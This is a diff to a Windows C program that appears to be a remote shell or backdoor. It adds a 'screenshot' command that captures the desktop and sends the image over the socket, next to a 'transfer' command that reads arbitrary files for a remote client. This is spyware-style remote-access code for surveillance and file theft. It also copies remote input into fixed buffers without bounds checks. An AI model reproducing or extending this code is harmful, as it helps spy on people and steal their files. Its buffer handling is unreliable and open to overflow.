@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <fileapi.h>
+#include "images.h"
 
 #include <winsock2.h>
 #include <windows.h>
@@ -16,8 +17,8 @@
 /*
 Communicates with the given socket from the server/shell side
 Return values:
-    0 - the connection should be ended
-    1 - continue the connection
+    0 - exited normally
+    1 - exited with error
 */
 int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE){
     char buf[BUF_SIZE];     // space for reply from client
@@ -133,8 +134,6 @@ void sendFile(SOCKET sock, FILE *file, int REPLY_MAX_SIZE){
         free(buffer);
     }
 
-
-
 }
 /*
 Function for proccessing the input sent from the client
@@ -160,8 +159,12 @@ Process external commands. Perform function and return output
 FILE* processExtCmd(char * cmd, char * cwd, int * replyType){
     char cmdCpy[128];
     strncpy(cmdCpy, cmd, sizeof(cmdCpy));
+    // stored the top level (first) first command
+    char * topCmd;
+    topCmd = strtok(cmdCpy, " ");
 
-    if (strcmp(cmd, "reset") == 0){
+
+    if (strcmp(topCmd, "reset") == 0){
         char * temp;
         temp = getCmdOutStr("echo %HOMEDRIVE%%HOMEPATH%", 128);
         temp[strcspn(temp, "\n")] = '\0';
@@ -170,14 +173,28 @@ FILE* processExtCmd(char * cmd, char * cwd, int * replyType){
         *replyType = 0;
         return getTempFile(cwd);
     }
-    else if (strcmp(strtok(cmdCpy, " "), "transfer") == 0) {
+    else if (strcmp(topCmd, "transfer") == 0) {
+        *replyType = 1;
+
         char * temp = cmd;
         temp += (strcspn(cmd, " ")+1); // get the entire second argument whether or not it includes spaces
         char filename[128];
         sprintf(filename, "%s\\%s", cwd, temp);
 
-        *replyType = 1;
         return fopen(filename, "rb");
+    }
+    else if (strcmp(topCmd, "screenshot") == 0){
+        *replyType = 1;
+
+        // get a temp file name to use for this thing
+        char path[64];
+        char filename[260];
+        GetTempPathA(sizeof(path), path);
+        GetTempFileNameA(path, "buf", 1, filename);
+
+        captureImage(GetDesktopWindow(), filename);
+        return fopen(filename, "rb");
+
     }
     else{
         *replyType = 0;
@@ -268,7 +285,6 @@ char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE){
 /*
 Returns a pointer to a temp file created with the given text written into it
 The name/path of the file is placed into the filename parameter
-The name/path of the file is preserved solely so it can be deleted later
 */
 FILE* getTempFile(char * string){
    FILE* file;
